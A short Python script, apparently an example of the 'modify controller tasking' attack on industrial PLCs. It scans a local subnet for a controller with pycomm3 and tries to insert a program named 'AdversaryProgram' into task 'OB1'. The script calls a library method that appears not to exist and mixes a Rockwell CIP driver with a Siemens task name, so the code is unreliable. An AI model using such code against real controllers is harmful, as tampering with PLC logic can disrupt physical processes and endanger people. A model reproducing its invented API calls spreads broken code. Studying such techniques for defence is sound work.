import pycomm3
import socket

# Function to discover the PLC's IP address
def discover_plc_ip():
    # This is a simple example of discovering the PLC's IP address.
    # In a real-world scenario, you might use a more sophisticated method.
    # For example, you could use a network scanner or a known IP range.
    ip_range = "192.168.1."
    for i in range(1, 255):
        ip = f"{ip_range}{i}"
        try:
            # Attempt to connect to the PLC
            with pycomm3.CipDriver(ip) as plc:
                if plc.open():
                    print(f"PLC found at IP: {ip}")
                    return ip
        except Exception as e:
            continue
    return None

# Function to modify the controller tasking
def modify_controller_tasking(plc_ip, program_name, task_name):
    with pycomm3.CipDriver(plc_ip) as plc:
        if not plc.open():
            print("Failed to connect to the PLC.")
            return

        try:
            # Example: Adding a program to a specific task
            # This is a simplified example. In a real scenario, you would need to
            # interact with the PLC's tasking structure and modify it accordingly.
            # For Siemens PLCs, you might need to use a different library or method.

            # Example: Adding a program to OB1
            plc.add_program_to_task(program_name, task_name)
            print(f"Program '{program_name}' added to task '{task_name}' successfully.")
        except Exception as e:
            print(f"Failed to modify controller tasking: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        print("PLC not found.")
        return

    # Define the program and task names
    program_name = "AdversaryProgram"
    task_name = "OB1"

    # Modify the controller tasking
    modify_controller_tasking(plc_ip, program_name, task_name)

if __name__ == "__main__":
    main()